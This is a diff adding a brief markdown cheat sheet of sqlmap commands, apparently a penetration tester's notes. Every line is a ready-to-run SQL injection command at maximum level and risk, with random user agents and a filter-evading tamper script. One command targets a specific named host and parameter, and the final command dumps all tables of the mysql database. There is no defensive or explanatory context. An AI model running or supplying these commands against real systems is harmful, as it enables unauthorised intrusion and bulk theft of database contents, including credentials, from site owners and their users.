@@ -1,0 +1,13 @@
+### SQL Map ###
+
+Note: If wanted to test the particular parameter with -r then use * to indicate that parameter
+
+sqlmap -r sqlmap --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --threads 5
+
+sqlmap -r sql --batch --dbs --random-agent --force-ssl --level 5 --risk 3 --tamper=space2comment --thread 5
+
+sqlmap -u "https://venus.bflaf.com:1514/icrm/index.php?r=" -p "r" --force-ssl --level 5 --risk 3 --dbs --random-agent --batch --time-sec 10
+
+_________After getting the databases name try to dump everything using the below command_________
+
+sqlmap -r sqlmap --level 5 --risk 3 -D mysql --dump-all --batch --random-agent --force-ssl --thread 5 --> Note -D for database name
